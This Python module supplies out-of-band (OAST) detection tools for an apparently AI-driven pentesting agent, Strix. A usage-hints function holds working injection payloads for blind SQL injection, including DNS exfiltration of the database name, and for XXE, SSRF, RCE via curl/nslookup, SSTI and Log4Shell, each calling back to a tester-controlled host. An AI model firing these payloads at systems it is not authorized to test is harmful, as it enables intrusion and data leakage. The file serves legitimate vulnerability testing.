"""OAST tool actions for Strix agent.

Provides registered tools for generating and checking OAST payloads.
"""
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.oast.oast_manager import get_oast_manager


@register_tool
def generate_oast_payload(
    vuln_type: str,
    payload_type: Literal["dns", "http", "both"] = "both",
    description: str = "",
    context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Generate an OAST (Out-of-Band) payload for blind vulnerability detection.
    
    Use this tool when testing for blind vulnerabilities that don't produce
    visible output but may trigger external callbacks (DNS lookups or HTTP requests).
    
    Supported vulnerability types:
    - sqli_blind: Blind SQL injection
    - sqli_mysql: MySQL-specific SQL injection with DNS exfiltration
    - xxe: XML External Entity injection
    - ssrf: Server-Side Request Forgery
    - rce: Remote Code Execution
    - ssti: Server-Side Template Injection
    - log4j: Log4Shell/JNDI injection
    
    Args:
        vuln_type: Type of vulnerability being tested
        payload_type: Type of callback - "dns" for DNS lookups, "http" for HTTP requests, "both" for either
        description: Human-readable description of this test
        context: Additional context (e.g., parameter name, endpoint)
        
    Returns:
        Dictionary containing:
        - payload_id: Unique ID to check for callbacks later
        - dns_payload: DNS-based payload to inject (if applicable)
        - http_payload: HTTP-based payload to inject (if applicable)
        - marker: Unique marker to identify callbacks
        
    Example:
        >>> result = generate_oast_payload("ssrf", payload_type="http", description="Testing image URL parameter")
        >>> # Use result["http_payload"] in your injection
        >>> # Later: check_oast_interactions(result["payload_id"])
    """
    manager = get_oast_manager()
    
    payload = manager.generate_payload(
        vuln_type=vuln_type,
        payload_type=payload_type,
        context=context or {},
        description=description,
    )
    
    return {
        "payload_id": payload.id,
        "marker": payload.marker,
        "vuln_type": payload.vuln_type,
        "dns_payload": payload.dns_payload,
        "http_payload": payload.http_payload,
        "description": payload.description,
        "usage_hints": _get_usage_hints(vuln_type, payload),
    }


def _get_usage_hints(vuln_type: str, payload: Any) -> dict[str, str]:
    """Get usage hints for different vulnerability types."""
    hints = {
        "sqli_blind": {
            "mysql_dns": f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({payload.dns_payload}),'\\\\a')))-- -",
            "postgres_http": f"'; COPY (SELECT '') TO PROGRAM 'curl {payload.http_payload}';-- -",
            "mssql_dns": f"'; EXEC master..xp_dirtree '\\\\{payload.dns_payload}\\a';-- -",
        },
        "sqli_mysql": {
            "dns_exfil": f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.{payload.dns_payload}\\\\a'))-- -",
        },
        "xxe": {
            "basic": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{payload.http_payload}">]><foo>&xxe;</foo>',
            "param_entity": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{payload.http_payload}"> %xxe;]>',
            "dns": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{payload.dns_payload}">]><foo>&xxe;</foo>',
        },
        "ssrf": {
            "http": payload.http_payload,
            "dns": f"http://{payload.dns_payload}/",
        },
        "rce": {
            "bash": f"curl {payload.http_payload}",
            "bash_dns": f"nslookup {payload.dns_payload}",
            "powershell": f"Invoke-WebRequest -Uri {payload.http_payload}",
        },
        "ssti": {
            "jinja2": f"{{{{ ''.__class__.__mro__[2].__subclasses__()[40]('{payload.http_payload}').read() }}}}",
            "twig": f"{{{{['curl','{payload.http_payload}']|filter('system')}}}}",
        },
        "log4j": {
            "jndi_ldap": f"${{jndi:ldap://{payload.dns_payload}/a}}",
            "jndi_dns": f"${{jndi:dns://{payload.dns_payload}}}",
            "jndi_rmi": f"${{jndi:rmi://{payload.dns_payload}/a}}",
        },
    }
    
    return hints.get(vuln_type, {"http": payload.http_payload or "", "dns": payload.dns_payload or ""})


@register_tool
def check_oast_interactions(
    payload_id: str,
    wait: bool = False,
    timeout: int = 10,
) -> dict[str, Any]:
    """Check for OAST callback interactions.
    
    Call this after injecting an OAST payload to see if the target
    triggered any DNS lookups or HTTP requests to our callback server.
    
    Args:
        payload_id: The payload ID returned by generate_oast_payload
        wait: If True, wait for callbacks up to timeout seconds
        timeout: Maximum time to wait in seconds (only if wait=True)
        
    Returns:
        Dictionary containing:
        - payload_id: The payload ID checked
        - has_callbacks: Whether any callbacks were received
        - callback_count: Number of callbacks received
        - callbacks: List of callback details
        - verdict: "VULNERABLE" if callbacks received, "NO_CALLBACK" otherwise
        
    Example:
        >>> result = check_oast_interactions("oast_abc123", wait=True, timeout=15)
        >>> if result["has_callbacks"]:
        ...     print("Blind vulnerability confirmed!")
    """
    manager = get_oast_manager()
    
    payload = manager.get_payload(payload_id)
    if not payload:
        return {
            "payload_id": payload_id,
            "error": f"Payload {payload_id} not found",
            "has_callbacks": False,
            "callback_count": 0,
            "callbacks": [],
        }
    
    if wait:
        callback = manager.wait_for_callback(payload_id, timeout=timeout)
        if callback:
            callbacks = payload.callbacks
        else:
            callbacks = []
    else:
        callbacks = manager.check_interactions(payload_id)
    
    callback_dicts = [cb.to_dict() for cb in callbacks]
    has_callbacks = len(callbacks) > 0
    
    return {
        "payload_id": payload_id,
        "vuln_type": payload.vuln_type,
        "description": payload.description,
        "has_callbacks": has_callbacks,
        "callback_count": len(callbacks),
        "callbacks": callback_dicts,
        "verdict": "VULNERABLE - Callback received!" if has_callbacks else "NO_CALLBACK - No interaction detected",
        "dns_payload_used": payload.dns_payload,
        "http_payload_used": payload.http_payload,
    }


@register_tool
def list_oast_payloads(
    vuln_type: str | None = None,
    with_callbacks_only: bool = False,
) -> dict[str, Any]:
    """List all generated OAST payloads.
    
    Useful for reviewing all payloads generated during a session and
    checking which ones received callbacks.
    
    Args:
        vuln_type: Filter by vulnerability type (e.g., "ssrf", "xxe")
        with_callbacks_only: Only show payloads that received callbacks
        
    Returns:
        Dictionary containing:
        - total_count: Total number of payloads
        - with_callbacks_count: Number of payloads with callbacks
        - payloads: List of payload summaries
    """
    manager = get_oast_manager()
    
    payloads = manager.list_payloads(
        vuln_type=vuln_type,
        with_callbacks_only=with_callbacks_only,
    )
    
    payload_dicts = [p.to_dict() for p in payloads]
    with_callbacks = [p for p in payloads if len(p.callbacks) > 0]
    
    return {
        "total_count": len(payloads),
        "with_callbacks_count": len(with_callbacks),
        "vulnerable_types": list(set(p.vuln_type for p in with_callbacks)),
        "payloads": payload_dicts,
    }


@register_tool
def clear_oast_payloads(
    older_than_hours: int | None = None,
) -> dict[str, Any]:
    """Clear stored OAST payloads.
    
    Use this to clean up old payloads and free memory during long sessions.
    
    Args:
        older_than_hours: Only clear payloads older than this many hours.
                         If None, clears all payloads.
        
    Returns:
        Dictionary with count of cleared payloads
    """
    manager = get_oast_manager()
    
    cleared = manager.clear_payloads(older_than_hours=older_than_hours)
    
    return {
        "cleared_count": cleared,
        "message": f"Cleared {cleared} OAST payload(s)",
    }
